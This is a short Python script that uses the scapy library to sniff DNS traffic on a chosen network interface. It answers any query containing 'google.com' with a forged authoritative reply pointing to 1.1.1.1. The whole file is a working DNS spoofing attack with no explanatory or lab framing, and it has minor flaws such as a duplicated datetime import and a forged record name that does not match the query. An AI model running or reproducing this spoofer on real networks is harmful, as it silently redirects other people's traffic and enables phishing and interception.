from scapy.all import *
from datetime import datetime
import time
import datetime
import sys

interface = input("[*] Enter Desired Interface: ")
filter_bpf = 'udp and port 53'


def dns_reply(pkt):
    spoofed_pkt = IP(dst=pkt[IP].src, src=pkt[IP].dst)/\
        UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport)/\
        DNS(id=pkt[DNS].id, qd=pkt[DNS].qd, aa=1, qr=1, \
        an=DNSRR(rrname="www.millesima.fr", ttl=100, rdata='1.1.1.1')) 
    send(spoofed_pkt)

def sniff_DNS(pkt):
    pkt_time = pkt.sprintf('%sent.time%')
    try:
        if DNSQR in pkt and pkt.dport == 53:
        # queries
           print('[**] Detected DNS QR Message at: ' + pkt_time)
           if pkt[DNS].qd.qname:
               print(str(pkt[DNS].qd.qname))
               if "google.com" in str(pkt[DNS].qd.qname):
                dns_reply(pkt)
           # 
        elif DNSRR in pkt and pkt.sport == 53:
            print ('[**] Detected DNS RR Message at: ' + pkt_time)
            if pkt[DNS].qd.qname:
               print(str(pkt[DNS].qd.qname))
        # responses

 # 
    except:
        pass
# ------ START SNIFFER 

sniff(iface=interface, filter=filter_bpf, store=0,  prn=sniff_DNS)

